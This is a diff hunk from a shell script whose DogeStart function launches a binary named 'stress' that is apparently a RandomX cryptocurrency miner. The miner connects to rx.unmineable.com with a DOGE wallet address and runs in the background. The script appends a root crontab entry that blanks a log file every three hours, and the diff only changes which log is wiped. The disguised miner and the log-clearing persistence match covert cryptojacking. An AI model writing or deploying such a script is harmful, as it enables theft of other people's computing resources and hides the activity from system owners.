@@ -21,7 +21,7 @@ function DogeStatus(){
 function DogeStart(){
     cd /opt/src/stress
     ./stress -a rx -k -o rx.unmineable.com:13333 -u DOGE:DN8ejjCTkpkP6ZV8vfW5chHoMow4DTHtC8.doge -B -l /opt/src/stress/stress.log
-    echo "00 */3 * * * root echo '' >/opt/src/stress/stress.log" >> /etc/crontab
+    echo "00 */3 * * * root echo '' >/opt/src/stress/nohup.out" >> /etc/crontab
     # echo $dogepid
     DogeStatus
 }
